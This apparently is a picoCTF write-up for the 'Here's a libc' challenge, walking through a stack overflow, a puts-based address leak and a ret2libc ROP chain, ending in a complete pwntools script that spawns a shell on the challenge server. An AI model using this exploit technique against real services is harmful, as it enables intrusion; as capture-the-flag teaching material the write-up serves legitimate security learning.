---
title: "Here's a libc"
date: "2025-07-23"
tags: ["picoCTF", "ret2libc", "ROP"]
---

In this exercise we get a binary, a libc and a makefile.

```c
./vuln_patched         
WeLcOmE To mY EcHo sErVeR!
hola
HoLa
```

In this exercise our goal is the following:

1. Print the libc address
2. Call system(“/bin/sh“)

The binary has a vulnerability where the buffer is not bounded and we can overwrite values on the stack.

```c
./vuln_patched
WeLcOmE To mY EcHo sErVeR!
999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999
999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999d
zsh: segmentation fault  ./vuln_patched
```

Let's find the offset:

```c
cyclic 200
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa

RSP  0x7fffffffdc08 ◂— 'raaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa'

pwndbg> cyclic -l 'raaaaaaa'
Finding cyclic pattern of 8 bytes: b'raaaaaaa' (hex: 0x7261616161616161)
Found at offset 136
```

Right, now that we know where the return address is and we control RIP we can try to get the libc base address.

For that we can use `puts` to leak the address of `puts` and then work out the libc base in our `solve.py`:

```c
offset = 136

puts_plt = exe.plt['puts']
puts_got = exe.got['puts']
main_addr = exe.symbols['main']
pop_rdi = 0x00400913 # pop rdi; ret

payload1 = flat({
    offset: [
        pop_rdi,
        puts_got, // Dirección de puts
        puts_plt, // Dirección "cacheada" de puts
        main_addr // Dirección de Retorno
        ]
    })
    
leak = io.recvn(6)  // Hay que imprimirlo de esta forma porque la dirección tiene el byte 0a, que es un \n y la función recvline lo corta
leak = leak.ljust(8, b'\x00')
leak = u64(leak)
info(f'Leak: {hex(leak)}')
```

With this the program prints the address of puts inside the libc:

```c
[*] Leak: 0x7ffff7880a30
```

Now that we have the address we can tell pwntools where the libc is:

```python
libc.address = leak - libc.symbols['puts']
```

Now that we have updated the address we can write the script:

```python
#!/usr/bin/env python3

from pwn import *
import sys

exe = ELF("./vuln_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe
context.terminal = ['kitty']
gdb_script = f'''
b *{exe.plt['puts']}
continue
'''

def conn():
    if args.REMOTE:
        return remote("mercury.picoctf.net", 37289)
    r = process([exe.path])
    if args.GDB:
        gdb.attach(r, gdbscript=gdb_script)
    return r

offset = 136

puts_plt = exe.plt['puts']
puts_got = exe.got['puts']
main_addr = exe.symbols['main']
pop_rdi = 0x00400913 # pop rdi; ret
ret = 0x0040052e

def main():

    payload1 = flat({
        offset: [
            pop_rdi,
            puts_got,
            puts_plt,
            main_addr
        ]
    })

    io = conn()
    io.sendlineafter(b'!', payload1)
    leak = io.recvlines(2)
    leak = io.recvn(6)
    leak = leak.ljust(8, b'\x00')
    leak = u64(leak)
    info(f'Leak: {hex(leak)}')
    info(f'Puts plt: {hex(puts_plt)}')
    info(f'Puts got: {hex(puts_got)}')
    
    libc.address = leak - libc.symbols['puts']

    info(f'Base del binario: {hex(libc.address)}')
    bin_sh = next(libc.search(b"/bin/sh"))
    
    payload2 = flat({
        offset: [
            ret,  # El Stack estaba desalineado
            pop_rdi,
            bin_sh,
            libc.symbols['system']
        ]
    })
    
    io.sendlineafter(b'!', payload2)
    io.interactive()

if __name__ == "__main__":
    main()

```

It works!

```c
   ~/Desktop/picoCTF/heres_a_libc ❯ python solve.py
[*] '/home/ub1cu0/Desktop/picoCTF/heres_a_libc/vuln_patched'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    RUNPATH:    b'.'
    Stripped:   No
[+] Opening connection to mercury.picoctf.net on port 37289: Done
[*] Leak: 0x7f82d1bd6a30
[*] Puts plt: 0x400540
[*] Puts got: 0x601018
[*] Base del binario: 0x7f82d1b56000
[*] Switching to interactive mode

AaAaBaAaCaAaDaAaEaAaFaAaGaAaHaAaIaAaJaAaKaAaLaAaMaAaNaAaOaAaPaAaQaAaRaAaSaAaTaAaUaAaVaAaWaAaXaAaYaAazaabbaabcaabdaabeaabd$  
$ whoami
here-s-a-libc_1
$ ls
flag.txt
libc.so.6
vuln
vuln.c
xinet_startup.sh
```
